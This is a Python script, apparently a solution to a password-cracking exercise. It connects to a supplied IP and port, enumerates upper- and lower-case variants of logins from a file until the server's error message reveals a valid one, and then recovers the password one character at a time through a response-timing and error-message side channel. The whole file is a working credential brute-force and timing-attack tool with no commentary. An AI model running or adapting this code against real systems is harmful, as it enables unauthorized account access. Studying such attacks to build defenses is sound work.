import socket, argparse
from itertools import product
from string import ascii_letters, digits
import json
from time import time


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str)
    parser.add_argument("port", type=int)

    args = parser.parse_args()

    with socket.socket() as client:
        address = (args.ip, args.port)
        client.connect(address)

        for login in gen_login():
            login_message = {"login": login, "password": "1"}
            client.send(json.dumps(login_message).encode())
            login_response = client.recv(1024).decode('utf-8')
            if json.loads(login_response)['result'] == "Wrong password!":
                correct_login = login
                break

        psw = ''
        try_psw = True
        while try_psw:
            for letter in gen_password():
                psw_message = {"login": correct_login, "password": psw + letter}
                client.send(json.dumps(psw_message).encode())
                start = time()
                psw_response = client.recv(1024).decode('utf-8')
                end = time()
                if json.loads(psw_response)['result'] == "Exception happened during login" or \
                        end - start > 0.05:
                    psw += letter
                    break

                elif json.loads(psw_response)['result'] == "Connection success!":
                    print(json.dumps(psw_message))
                    try_psw = False
                    break


def gen_password():
    char_base = ascii_letters + digits
    for letter in char_base:
        yield letter


def gen_login():
    file_path = r"logins.txt"
    with open(file_path, 'r') as login_file:
        for line in login_file:
            upper = line.strip().upper()
            lower = line.strip().lower()
            for logins in product(*zip(upper, lower)):
                yield ''.join(logins)


if __name__ == "__main__":
    main()
